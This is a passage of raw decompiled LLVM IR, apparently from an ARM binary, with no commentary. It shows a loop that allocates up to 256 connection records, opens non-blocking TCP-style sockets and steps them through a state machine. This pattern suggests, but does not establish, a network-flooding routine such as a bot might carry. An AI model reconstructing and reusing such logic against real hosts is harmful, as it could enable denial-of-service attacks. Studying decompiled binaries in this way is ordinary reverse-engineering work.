  %v7_82f0 = icmp sgt i32 %v2_82e8, 9
  br i1 %v7_82f0, label %dec_label_pc_82b4, label %bb158

bb158:                                            ; preds = %dec_label_pc_82e4
  %v10_82f0 = ptrtoint i32* %stack_var_-400 to i32
  store i32 %v10_82f0, i32* %r2.global-to-local, align 4
  %v8_82f4 = load i32, i32* @r4, align 4
  %v10_82f4 = add i32 %v10_82f0, 356
  %v11_82f4 = inttoptr i32 %v10_82f4 to i32*
  store i32 %v8_82f4, i32* %v11_82f4, align 4
  br label %dec_label_pc_82fc

dec_label_pc_82fc:                                ; preds = %bb158, %bb162
  %v0_82fc = load i32, i32* @sl, align 4
  store i32 %v0_82fc, i32* %r0.global-to-local, align 4
  %v1_8300 = inttoptr i32 %v0_82fc to i8*
  %v2_8300 = call i32 @function_12324(i8* %v1_8300)
  store i32 %v2_8300, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  %v3_8308 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_8308, i32* %ip.global-to-local, align 4
  %v3_830c = icmp uge i32 %v2_8300, %v3_8308
  store i1 %v3_830c, i1* %cpsr_c.global-to-local, align 1
  %v9_830c = icmp eq i32 %v2_8300, %v3_8308
  store i1 %v9_830c, i1* %cpsr_z.global-to-local, align 1
  %v7_8310 = icmp sgt i32 %v2_8300, %v3_8308
  br i1 %v7_8310, label %dec_label_pc_8314, label %dec_label_pc_8340

dec_label_pc_8314:                                ; preds = %dec_label_pc_82fc
  %v0_8314 = load i32, i32* @sl, align 4
  %v2_8314 = add i32 %v0_8314, %v3_8308
  %v3_8314 = inttoptr i32 %v2_8314 to i8*
  %v4_8314 = load i8, i8* %v3_8314, align 1
  %v6_8314 = zext i8 %v4_8314 to i32
  %v1_8318 = add nsw i32 %v6_8314, -32
  store i32 %v1_8318, i32* %r2.global-to-local, align 4
  %v1_831c = add nsw i32 %v6_8314, -97
  store i32 %v1_831c, i32* %r3.global-to-local, align 4
  %v2_8320 = icmp ugt i32 %v1_831c, 24
  store i1 %v2_8320, i1* %cpsr_c.global-to-local, align 1
  %v7_8320 = icmp eq i32 %v1_831c, 25
  store i1 %v7_8320, i1* %cpsr_z.global-to-local, align 1
  %v2_8324 = xor i1 %v2_8320, true
  %v3_8324 = or i1 %v7_8320, %v2_8324
  br i1 %v3_8324, label %bb159, label %bb160

bb159:                                            ; preds = %dec_label_pc_8314
  %v5_8324 = trunc i32 %v1_8318 to i8
  store i8 %v5_8324, i8* %v3_8314, align 1
  %v0_8328.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_8328.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb160

bb160:                                            ; preds = %dec_label_pc_8314, %bb159
  %v1_832c = phi i1 [ %v2_8320, %dec_label_pc_8314 ], [ %v1_8328.pre, %bb159 ]
  %v0_832c = phi i1 [ false, %dec_label_pc_8314 ], [ %v0_8328.pre, %bb159 ]
  %v2_8328 = xor i1 %v1_832c, true
  %v3_8328 = or i1 %v0_832c, %v2_8328
  br i1 %v3_8328, label %bb161, label %._crit_edge

._crit_edge:                                      ; preds = %bb160
  %v0_8334.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb162

bb161:                                            ; preds = %bb160
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v7_832c = load i32, i32* %v11_82f4, align 4
  store i32 %v7_832c, i32* %ip.global-to-local, align 4
  br label %bb162

bb162:                                            ; preds = %._crit_edge, %bb161
  %v0_8334 = phi i32 [ %v0_8334.pre, %._crit_edge ], [ %v7_832c, %bb161 ]
  store i32 %v10_82f0, i32* @lr, align 4
  %v1_8334 = add i32 %v0_8334, 1
  store i32 %v1_8334, i32* %ip.global-to-local, align 4
  store i32 %v1_8334, i32* %stack_var_-44, align 4
  br label %dec_label_pc_82fc

dec_label_pc_8340:                                ; preds = %dec_label_pc_82fc
  store i32 36, i32* %r0.global-to-local, align 4
  %v1_8344 = call i32 @function_11a94(i32 36)
  store i32 37, i32* %r0.global-to-local, align 4
  %v1_834c = call i32 @function_11a94(i32 37)
  store i32 38, i32* %r0.global-to-local, align 4
  %v1_8354 = call i32 @function_11a94(i32 38)
  store i32 39, i32* %r0.global-to-local, align 4
  %v1_835c = call i32 @function_11a94(i32 39)
  store i32 40, i32* %r0.global-to-local, align 4
  %v1_8364 = call i32 @function_11a94(i32 40)
  store i32 41, i32* %r0.global-to-local, align 4
  %v1_836c = call i32 @function_11a94(i32 41)
  store i32 42, i32* %r0.global-to-local, align 4
  %v1_8374 = call i32 @function_11a94(i32 42)
  store i32 43, i32* %r0.global-to-local, align 4
  %v1_837c = call i32 @function_11a94(i32 43)
  store i32 44, i32* %r0.global-to-local, align 4
  %v1_8384 = call i32 @function_11a94(i32 44)
  store i32 45, i32* %r0.global-to-local, align 4
  %v1_838c = call i32 @function_11a94(i32 45)
  store i32 %v1_838c, i32* %r0.global-to-local, align 4
  %v0_8390 = load i32, i32* @r6, align 4
  %v3_8390 = icmp ugt i32 %v0_8390, 255
  store i1 %v3_8390, i1* %cpsr_c.global-to-local, align 1
  %v8_8390 = icmp eq i32 %v0_8390, 256
  store i1 %v8_8390, i1* %cpsr_z.global-to-local, align 1
  %v5_8394 = icmp slt i32 %v0_8390, 256
  br i1 %v5_8394, label %thread-pre-split, label %bb163

bb163:                                            ; preds = %dec_label_pc_8340
  store i32 256, i32* @r6, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_8340, %bb163
  %v0_839c = phi i32 [ 256, %bb163 ], [ %v0_8390, %dec_label_pc_8340 ]
  store i32 46, i32* %r0.global-to-local, align 4
  %v1_83a0 = call i32 @function_11a94(i32 46)
  store i32 %v0_839c, i32* %r0.global-to-local, align 4
  store i32 3140, i32* %r1.global-to-local, align 4
  %v2_83b0 = call i32 @function_1320c(i32 %v0_839c, i32 3140)
  store i32 %v2_83b0, i32* %r0.global-to-local, align 4
  store i32 %v0_839c, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_83b8 = icmp eq i32 %v0_839c, 0
  store i1 %v2_83b8, i1* %cpsr_z.global-to-local, align 1
  %tmp164 = icmp slt i32 %v0_839c, 1
  br i1 %tmp164, label %dec_label_pc_84d4, label %dec_label_pc_83c4

dec_label_pc_83c4:                                ; preds = %thread-pre-split
  store i32 %v2_83b0, i32* @r5, align 4
  store i32 0, i32* @sb, align 4
  %v2_83f0 = and i32 %arg1, 536870912
  %v3_83f0 = icmp ne i32 %v2_83f0, 0
  %v5_83f0 = mul i32 %arg1, 24
  %v2_83f4 = add i32 %v5_83f0, %arg2
  %v1_83f8 = add i32 %v2_83f4, 16
  %v2_83f8 = inttoptr i32 %v1_83f8 to i32*
  br label %dec_label_pc_83cc

dec_label_pc_83cc:                                ; preds = %dec_label_pc_9df8, %dec_label_pc_83c4
  %v1_83d8 = phi i32 [ %v1_9e14, %dec_label_pc_9df8 ], [ %v2_83b0, %dec_label_pc_83c4 ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %v2_83d8 = inttoptr i32 %v1_83d8 to i32*
  store i32 -1, i32* %v2_83d8, align 4
  %v0_83dc = load i32, i32* %r3.global-to-local, align 4
  %v1_83dc = trunc i32 %v0_83dc to i8
  %v2_83dc = load i32, i32* @r5, align 4
  %v3_83dc = add i32 %v2_83dc, 4
  %v4_83dc = inttoptr i32 %v3_83dc to i8*
  store i8 %v1_83dc, i8* %v4_83dc, align 1
  %v0_83e0 = load i32, i32* @sb, align 4
  store i32 %v0_83e0, i32* %r0.global-to-local, align 4
  %v2_83e4 = call i32 @function_12b60(i32 %v0_83e0, i32 %arg1)
  store i32 %v2_83e4, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  store i1 %v3_83f0, i1* %cpsr_c.global-to-local, align 1
  store i32 %v5_83f0, i32* %r3.global-to-local, align 4
  store i32 %v2_83f4, i32* @r6, align 4
  %v3_83f8 = load i32, i32* %v2_83f8, align 4
  store i32 %v3_83f8, i32* %r2.global-to-local, align 4
  %v0_83fc = load i32, i32* @r5, align 4
  %v1_83fc = add i32 %v0_83fc, 532
  store i32 %v1_83fc, i32* @fp, align 4
  store i32 %v1_83fc, i32* @r0, align 4
  %v0_8404 = load i32, i32* @r7, align 4
  store i32 %v0_8404, i32* %r1.global-to-local, align 4
  %v2_8408 = add i32 %v0_83fc, 16
  %v3_8408 = inttoptr i32 %v2_8408 to i32*
  store i32 %v3_83f8, i32* %v3_8408, align 4
  %v2_840c = inttoptr i32 %v1_83fc to i8*
  %v3_840c = call i32 @function_1234c(i8* %v2_840c, i32 %v0_8404)
  store i32 %v3_840c, i32* %r0.global-to-local, align 4
  %v0_8410 = load i32, i32* @r5, align 4
  %v1_8410 = add i32 %v0_8410, 532
  %v2_8410 = inttoptr i32 %v1_8410 to i8*
  %v3_8410 = load i8, i8* %v2_8410, align 1
  %v4_8410 = zext i8 %v3_8410 to i32
  store i32 %v4_8410, i32* %r3.global-to-local, align 4
  %v2_8414 = icmp ugt i8 %v3_8410, 46
  store i1 %v2_8414, i1* %cpsr_c.global-to-local, align 1
  %v7_8414 = icmp eq i8 %v3_8410, 47
  store i1 %v7_8414, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8414, label %dec_label_pc_8440, label %dec_label_pc_841c

dec_label_pc_841c:                                ; preds = %dec_label_pc_83cc
  %v0_841c = load i32, i32* @fp, align 4
  store i32 %v0_841c, i32* %r0.global-to-local, align 4
  %v1_8420 = inttoptr i32 %v0_841c to i8*
  %v2_8420 = call i32 @function_12324(i8* %v1_8420)
  store i32 %v2_8420, i32* %r2.global-to-local, align 4
  %v0_8428 = load i32, i32* @r5, align 4
  %v1_842c = add i32 %v0_8428, 533
  store i32 %v1_842c, i32* %r0.global-to-local, align 4
  %v0_8430 = load i32, i32* @fp, align 4
  store i32 %v0_8430, i32* %r1.global-to-local, align 4
  %v3_8434 = inttoptr i32 %v1_842c to i8*
  %v4_8434 = call i32 @function_153fc(i8* %v3_8434, i32 %v0_8430, i32 %v2_8420)
  store i32 %v4_8434, i32* %r0.global-to-local, align 4
  store i32 47, i32* %r3.global-to-local, align 4
  %v2_843c = load i32, i32* @r5, align 4
  %v3_843c = add i32 %v2_843c, 532
  %v4_843c = inttoptr i32 %v3_843c to i8*
  store i8 47, i8* %v4_843c, align 1
  %v0_8444.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_8440

dec_label_pc_8440:                                ; preds = %dec_label_pc_83cc, %dec_label_pc_841c
  %v0_8444 = phi i32 [ %v0_8410, %dec_label_pc_83cc ], [ %v0_8444.pre, %dec_label_pc_841c ]
  %v0_8440 = load i32, i32* @sl, align 4
  store i32 %v0_8440, i32* %r1.global-to-local, align 4
  %v1_8444 = add i32 %v0_8444, 1440
  store i32 %v1_8444, i32* @r0, align 4
  %v2_8448 = inttoptr i32 %v1_8444 to i8*
  %v3_8448 = call i32 @function_1234c(i8* %v2_8448, i32 %v0_8440)
  %v0_844c = load i32, i32* @r5, align 4
  %v0_8450 = load i32, i32* @sl, align 4
  store i32 %v0_8450, i32* %r1.global-to-local, align 4
  %v1_8454 = add i32 %v0_844c, 1431
  store i32 %v1_8454, i32* @r0, align 4
  %v2_8458 = inttoptr i32 %v1_8454 to i8*
  %v3_8458 = call i32 @function_1234c(i8* %v2_8458, i32 %v0_8450)
  %v0_845c = load i32, i32* @r5, align 4
  %v1_8460 = add i32 %v0_845c, 789
  store i32 %v1_8460, i32* @r0, align 4
  %v0_8464 = load i32, i32* @r8, align 4
  store i32 %v0_8464, i32* %r1.global-to-local, align 4
  %v2_8468 = inttoptr i32 %v1_8460 to i8*
  %v3_8468 = call i32 @function_1234c(i8* %v2_8468, i32 %v0_8464)
  store i32 %v3_8468, i32* %r0.global-to-local, align 4
  %v0_846c = load i32, i32* @r6, align 4
  %v1_846c = add i32 %v0_846c, 20
  %v2_846c = inttoptr i32 %v1_846c to i8*
  %v3_846c = load i8, i8* %v2_846c, align 1
  %v4_846c = zext i8 %v3_846c to i32
  store i32 %v4_846c, i32* %r3.global-to-local, align 4
  %v2_8470 = icmp ugt i8 %v3_846c, 30
  store i1 %v2_8470, i1* %cpsr_c.global-to-local, align 1
  %v7_8470 = icmp eq i8 %v3_846c, 31
  store i1 %v7_8470, i1* %cpsr_z.global-to-local, align 1
  %v2_8474 = xor i1 %v7_8470, true
  %v3_8474 = and i1 %v2_8470, %v2_8474
  br i1 %v3_8474, label %dec_label_pc_8498, label %dec_label_pc_8478

dec_label_pc_8478:                                ; preds = %dec_label_pc_8440
  %v1_8478 = add i32 %v0_846c, 16
  %v2_8478 = inttoptr i32 %v1_8478 to i32*
  %v3_8478 = load i32, i32* %v2_8478, align 4
  store i32 %v3_8478, i32* %r0.global-to-local, align 4
  %v1_847c = call i32 @function_149d0(i32 %v3_8478)
  store i32 %v1_847c, i32* %r0.global-to-local, align 4
  store i32 %v1_847c, i32* @r4, align 4
  %v0_8484 = call i32 @function_f570()
  store i32 %v0_8484, i32* %r0.global-to-local, align 4
  %v0_8488 = load i32, i32* @r6, align 4
  %v1_8488 = add i32 %v0_8488, 20
  %v2_8488 = inttoptr i32 %v1_8488 to i8*
  %v3_8488 = load i8, i8* %v2_8488, align 1
  %v4_8488 = zext i8 %v3_8488 to i32
  store i32 %v4_8488, i32* %r3.global-to-local, align 4
  %v0_848c = load i32, i32* @r4, align 4
  %v3_848c = add nsw i32 %v4_8488, -1
  %v4_848c = shl i32 1, %v3_848c
  %v5_848c = and i32 %v4_848c, %v0_8484
  %v6_848c = icmp ne i32 %v5_848c, 0
  store i1 %v6_848c, i1* %cpsr_c.global-to-local, align 1
  %v7_848c = lshr i32 %v0_8484, %v4_8488
  %v8_848c = add i32 %v7_848c, %v0_848c
  store i32 %v8_848c, i32* %r0.global-to-local, align 4
  %v1_8490 = call i32 @function_14828(i32 %v8_848c)
  store i32 %v1_8490, i32* %r0.global-to-local, align 4
  %v1_8494 = load i32, i32* @r5, align 4
  %v2_8494 = add i32 %v1_8494, 16
  %v3_8494 = inttoptr i32 %v2_8494 to i32*
  store i32 %v1_8490, i32* %v3_8494, align 4
  br label %dec_label_pc_8498

dec_label_pc_8498:                                ; preds = %dec_label_pc_8440, %dec_label_pc_8478
  %v0_8498 = call i32 @function_f570()
  %v3_84a4 = udiv i32 %v0_8498, 5
  store i32 %v3_84a4, i32* %r2.global-to-local, align 4
  store i32 %v3_84a4, i32* %r3.global-to-local, align 4
  %v2_84b0 = sub i32 %v0_8498, %v3_84a4
  store i32 %v2_84b0, i32* %r0.global-to-local, align 4
  %v7_84b4 = icmp eq i32 %v2_84b0, 4
  store i1 %v7_84b4, i1* %cpsr_z.global-to-local, align 1
  %v5_84b8 = and i32 %v2_84b0, 1073741824
  %v6_84b8 = icmp ne i32 %v5_84b8, 0
  store i1 %v6_84b8, i1* %cpsr_c.global-to-local, align 1
  switch i32 %v2_84b0, label %dec_label_pc_9df8 [
    i32 0, label %dec_label_pc_9eac
    i32 1, label %dec_label_pc_9e80
    i32 2, label %dec_label_pc_9ed8
    i32 3, label %dec_label_pc_9dd0
    i32 4, label %dec_label_pc_9e40
  ]

dec_label_pc_84d4:                                ; preds = %thread-pre-split
  %v1_84e4 = add i32 %v2_83b0, 1452
  store i32 %v1_84e4, i32* %ip.global-to-local, align 4
  %v2_84e8 = ptrtoint i32* %stack_var_-10572 to i32
  store i32 %v2_84e8, i32* @lr, align 4
  br label %dec_label_pc_84f4.preheader

dec_label_pc_84f4.preheader:                      ; preds = %dec_label_pc_84d4, %dec_label_pc_9e1c
  %stack_var_-20860.0.ph = phi i32 [ %v2_9e30, %dec_label_pc_9e1c ], [ %v2_84e8, %dec_label_pc_84d4 ]
  %stack_var_-20868.0.ph = phi i32 [ %v1_9e2c, %dec_label_pc_9e1c ], [ %v1_84e4, %dec_label_pc_84d4 ]
  %v2_865c = ptrtoint i32* %stack_var_-144 to i32
  %v2_8674 = ptrtoint i32* %stack_var_-44 to i32
  %v2_86bc = ptrtoint i32* %stack_var_-76 to i32
  %v2_86d8 = ptrtoint i32* %stack_var_-40 to i32
  %v1_88b8 = inttoptr i32 %stack_var_-20860.0.ph to i8*
  %v2_8c14 = icmp eq i32 %v6_81f8, 0
  %v1_8b10 = inttoptr i32 %v6_81f8 to i8*
  %v2_8740 = ptrtoint i32* %stack_var_-60 to i32
  %v2_8744 = ptrtoint i32* %stack_var_-204 to i32
  %v2_8748 = ptrtoint i32* %stack_var_-332 to i32
  %v2_8828 = ptrtoint i32* %stack_var_-48 to i32
  %v2_8834 = ptrtoint i32* %stack_var_-52 to i32
  br label %dec_label_pc_84f4

dec_label_pc_84f4:                                ; preds = %dec_label_pc_8720, %dec_label_pc_8554, %dec_label_pc_8718, %dec_label_pc_87b4, %dec_label_pc_84f4.preheader
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_84f8 = call i32 @function_15ad0(i32* null)
  store i32 %v2_84f8, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %stack_var_-204, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 20680, i32* %ip.global-to-local, align 4
  %v2_8524213 = load i32, i32* @sp, align 4
  %v3_8524214 = add i32 %v2_8524213, 20680
  %v4_8524215 = inttoptr i32 %v3_8524214 to i32*
  store i32 0, i32* %v4_8524215, align 4
  br label %dec_label_pc_8510.dec_label_pc_8510_crit_edge

dec_label_pc_8510.dec_label_pc_8510_crit_edge:    ; preds = %dec_label_pc_84f4, %dec_label_pc_8510.dec_label_pc_8510_crit_edge
  %v0_8510.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_8514 = add i32 %v0_8510.pre, 4
  store i32 %v1_8514, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_851c = add i32 %v0_8510.pre, 20676
  store i32 %v1_851c, i32* %ip.global-to-local, align 4
  %v7_8520 = icmp eq i32 %v1_8514, 128
  %v2_8524 = load i32, i32* @sp, align 4
  %v3_8524 = add i32 %v2_8524, %v1_851c
  %v4_8524 = inttoptr i32 %v3_8524 to i32*
  store i32 0, i32* %v4_8524, align 4
  br i1 %v7_8520, label %dec_label_pc_852c, label %dec_label_pc_8510.dec_label_pc_8510_crit_edge

dec_label_pc_852c:                                ; preds = %dec_label_pc_8510.dec_label_pc_8510_crit_edge
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 %v10_82f0, i32* @lr, align 4
  %v0_8530 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_8530, i32* %stack_var_-332, align 4
  %v0_8534 = load i32, i32* %r3.global-to-local, align 4
  %v1_853c216 = add i32 %v0_8534, -120
  store i32 %v1_853c216, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_8544217 = add i32 %v0_8534, 20424
  store i32 %v1_8544217, i32* %r1.global-to-local, align 4
  %v7_8548218 = icmp eq i32 %v1_853c216, 128
  %v2_854c219 = load i32, i32* @sp, align 4
  %v3_854c220 = add i32 %v2_854c219, %v1_8544217
  %v4_854c221 = inttoptr i32 %v3_854c220 to i32*
  store i32 0, i32* %v4_854c221, align 4
  br i1 %v7_8548218, label %dec_label_pc_8554, label %dec_label_pc_8538.dec_label_pc_8538_crit_edge

dec_label_pc_8538.dec_label_pc_8538_crit_edge:    ; preds = %dec_label_pc_852c, %dec_label_pc_8538.dec_label_pc_8538_crit_edge
  %v0_8538.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_853c = add i32 %v0_8538.pre, 4
  store i32 %v1_853c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_8544 = add i32 %v0_8538.pre, 20548
  store i32 %v1_8544, i32* %r1.global-to-local, align 4
  %v7_8548 = icmp eq i32 %v1_853c, 128
  %v2_854c = load i32, i32* @sp, align 4
  %v3_854c = add i32 %v2_854c, %v1_8544
  %v4_854c = inttoptr i32 %v3_854c to i32*
  store i32 0, i32* %v4_854c, align 4
  br i1 %v7_8548, label %dec_label_pc_8554, label %dec_label_pc_8538.dec_label_pc_8538_crit_edge

dec_label_pc_8554:                                ; preds = %dec_label_pc_8538.dec_label_pc_8538_crit_edge, %dec_label_pc_852c
  store i32 %v0_839c, i32* %r2.global-to-local, align 4
  %v1_8558 = load i32, i32* %r0.global-to-local, align 4
  %v3_8558 = icmp uge i32 %v0_839c, %v1_8558
  store i1 %v3_8558, i1* %cpsr_c.global-to-local, align 1
  %v9_8558 = icmp eq i32 %v0_839c, %v1_8558
  store i1 %v9_8558, i1* %cpsr_z.global-to-local, align 1
  %v7_855c = icmp sgt i32 %v0_839c, %v1_8558
  br i1 %v7_855c, label %dec_label_pc_8560, label %dec_label_pc_84f4

dec_label_pc_8560:                                ; preds = %dec_label_pc_8554
  store i32 %stack_var_-20868.0.ph, i32* @sl, align 4
  store i32 %v1_8558, i32* @r8, align 4
  store i32 %stack_var_-20868.0.ph, i32* @r6, align 4
  store i32 %v1_8558, i32* @r7, align 4
  br label %dec_label_pc_85d4

dec_label_pc_8574:                                ; preds = %dec_label_pc_85e8
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_8574 = icmp eq i8 %v3_85d4, 2
  store i1 %v7_8574, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8574, label %dec_label_pc_8cb4, label %dec_label_pc_857c

dec_label_pc_857c:                                ; preds = %dec_label_pc_8574
  %v2_857c = icmp ugt i8 %v3_85d4, 3
  store i1 %v2_857c, i1* %cpsr_c.global-to-local, align 1
  %v7_857c = icmp eq i8 %v3_85d4, 4
  store i1 %v7_857c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_857c, label %dec_label_pc_8884, label %dec_label_pc_8584

dec_label_pc_8584:                                ; preds = %dec_label_pc_857c
  %v1_8584 = add nsw i32 %v4_85d4, -6
  %v2_8584 = icmp ugt i8 %v3_85d4, 5
  store i1 %v2_8584, i1* %cpsr_c.global-to-local, align 1
  %v7_8584 = icmp eq i8 %v3_85d4, 6
  store i1 %v7_8584, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8584, label %dec_label_pc_8d4c, label %dec_label_pc_858c

dec_label_pc_858c:                                ; preds = %dec_label_pc_8584
  %v2_858c = icmp ugt i8 %v3_85d4, 6
  store i1 %v2_858c, i1* %cpsr_c.global-to-local, align 1
  %v7_858c = icmp eq i8 %v3_85d4, 7
  store i1 %v7_858c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_858c, label %dec_label_pc_8f84, label %dec_label_pc_8594

dec_label_pc_8594:                                ; preds = %dec_label_pc_858c
  %v2_8594 = icmp ugt i8 %v3_85d4, 9
  store i1 %v2_8594, i1* %cpsr_c.global-to-local, align 1
  %v7_8594 = icmp eq i8 %v3_85d4, 10
  store i1 %v7_8594, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8594, label %dec_label_pc_8fd8, label %dec_label_pc_859c

dec_label_pc_859c:                                ; preds = %dec_label_pc_8594
  %v1_859c = add nsw i32 %v4_85d4, -11
  %v2_859c = icmp ugt i8 %v3_85d4, 10
  store i1 %v2_859c, i1* %cpsr_c.global-to-local, align 1
  %v7_859c = icmp eq i8 %v3_85d4, 11
  store i1 %v7_859c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_859c, label %dec_label_pc_9574, label %dec_label_pc_85a4

dec_label_pc_85a4:                                ; preds = %dec_label_pc_8cb4, %dec_label_pc_859c
  store i32 0, i32* %r3.global-to-local, align 4
  store i8 0, i8* %v2_85d4, align 1
  %v0_85ac = load i32, i32* @r6, align 4
  %v1_85ac = add i32 %v0_85ac, -1452
  %v2_85ac = inttoptr i32 %v1_85ac to i32*
  %v3_85ac = load i32, i32* %v2_85ac, align 4
  store i32 %v3_85ac, i32* @r0, align 4
  %v1_85b0 = call i32 @function_15b20(i32 %v3_85ac)
  store i32 %v1_85b0, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_85b8 = load i32, i32* @r6, align 4
  %v2_85b8 = add i32 %v1_85b8, -1452
  %v3_85b8 = inttoptr i32 %v2_85b8 to i32*
  store i32 -1, i32* %v3_85b8, align 4
  br label %dec_label_pc_85bc

dec_label_pc_85bc:                                ; preds = %dec_label_pc_8d4c, %dec_label_pc_86e0, %dec_label_pc_85f0, %dec_label_pc_8fd8, %dec_label_pc_8f84, %dec_label_pc_9574, %bb168, %dec_label_pc_85a4
  store i32 %v0_839c, i32* %r2.global-to-local, align 4
  %v0_85c0 = load i32, i32* @r7, align 4
  %v1_85c0 = add i32 %v0_85c0, 1
  store i32 %v1_85c0, i32* @r7, align 4
  %v0_85c4 = load i32, i32* @r6, align 4
  %v3_85c8 = icmp uge i32 %v1_85c0, %v0_839c
  store i1 %v3_85c8, i1* %cpsr_c.global-to-local, align 1
  %v9_85c8 = icmp eq i32 %v1_85c0, %v0_839c
  store i1 %v9_85c8, i1* %cpsr_z.global-to-local, align 1
  %v1_85cc = add i32 %v0_85c4, 3140
  store i32 %v1_85cc, i32* @r6, align 4
  br i1 %v9_85c8, label %dec_label_pc_85bc.dec_label_pc_8718_crit_edge, label %dec_label_pc_85d4

dec_label_pc_85bc.dec_label_pc_8718_crit_edge:    ; preds = %dec_label_pc_85bc
  %v0_8718.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_8718

dec_label_pc_85d4:                                ; preds = %dec_label_pc_8700, %dec_label_pc_85bc, %dec_label_pc_8560
  %v3_8878 = phi i32 [ %stack_var_-20868.0.ph, %dec_label_pc_8560 ], [ %v1_85cc, %dec_label_pc_85bc ], [ %v1_8710, %dec_label_pc_8700 ]
  %v1_85d4 = add i32 %v3_8878, -1448
  %v2_85d4 = inttoptr i32 %v1_85d4 to i8*
  %v3_85d4 = load i8, i8* %v2_85d4, align 1
  %v4_85d4 = zext i8 %v3_85d4 to i32
  store i32 %v4_85d4, i32* %r3.global-to-local, align 4
  %v2_85dc = icmp ne i8 %v3_85d4, 0
  store i1 %v2_85dc, i1* %cpsr_c.global-to-local, align 1
  %v6_85dc = icmp eq i8 %v3_85d4, 0
  %v7_85dc = icmp eq i8 %v3_85d4, 1
  store i1 %v7_85dc, i1* %cpsr_z.global-to-local, align 1
  %v1_85e0 = add i32 %v3_8878, -1452
  store i32 %v1_85e0, i32* @r5, align 4
  br i1 %v7_85dc, label %dec_label_pc_886c, label %dec_label_pc_85e8

dec_label_pc_85e8:                                ; preds = %dec_label_pc_85d4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v6_85dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v6_85dc, label %dec_label_pc_85f0, label %dec_label_pc_8574

dec_label_pc_85f0:                                ; preds = %.thread18.dec_label_pc_85f0_crit_edge, %dec_label_pc_85e8
  %v0_85f0 = phi i32 [ %v0_85f0.pre, %.thread18.dec_label_pc_85f0_crit_edge ], [ %v3_8878, %dec_label_pc_85e8 ]
  %v1_85f0 = add i32 %v0_85f0, -1452
  %v2_85f0 = inttoptr i32 %v1_85f0 to i32*
  %v3_85f0 = load i32, i32* %v2_85f0, align 4
  store i32 %v3_85f0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v10_82f0, i32* %r3.global-to-local, align 4
  %v2_85fc = icmp eq i32 %v3_85f0, -1
  store i1 %v2_85fc, i1* %cpsr_c.global-to-local, align 1
  %v7_85fc = icmp eq i32 %v3_85f0, -1
  store i1 %v7_85fc, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-76, align 4
  store i32 34324, i32* @lr, align 4
  %v1_8610 = xor i1 %v7_85fc, true
  call void @__pseudo_cond_branch(i1 %v1_8610, i32 ptrtoint (i32* @global_var_15b20.24 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_861c = load i32, i32* @r5, align 4
  store i32 %v0_861c, i32* %r2.global-to-local, align 4
  %v3_8620 = call i32 @function_14b54(i32 2, i32 1, i32 %v0_861c)
  store i32 %v3_8620, i32* %r0.global-to-local, align 4
  %v2_8624 = icmp eq i32 %v3_8620, -1
  store i1 %v2_8624, i1* %cpsr_c.global-to-local, align 1
  %v7_8624 = icmp eq i32 %v3_8620, -1
  store i1 %v7_8624, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_8620, i32* @r4, align 4
  %v1_862c = load i32, i32* @r6, align 4
  %v2_862c = add i32 %v1_862c, -1452
  %v3_862c = inttoptr i32 %v2_862c to i32*
  store i32 %v3_8620, i32* %v3_862c, align 4
  br i1 %v7_8624, label %dec_label_pc_85bc, label %dec_label_pc_8634

dec_label_pc_8634:                                ; preds = %dec_label_pc_85f0
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_8638 = load i32, i32* @r5, align 4
  store i32 %v0_8638, i32* %r2.global-to-local, align 4
  %v3_863c = call i32 @function_12f68(i32 %v3_8620, i32 3, i32 %v0_8638)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_8644 = or i32 %v3_863c, 2048
  store i32 %v1_8644, i32* %r2.global-to-local, align 4
  %v0_8648 = load i32, i32* @r4, align 4
  store i32 %v0_8648, i32* %r0.global-to-local, align 4
  %v3_864c = call i32 @function_12f68(i32 %v0_8648, i32 4, i32 %v1_8644)
  store i32 %v3_864c, i32* %r0.global-to-local, align 4
  store i32 %v10_82f0, i32* @lr, align 4
  store i32 65535, i32* %ip.global-to-local, align 4
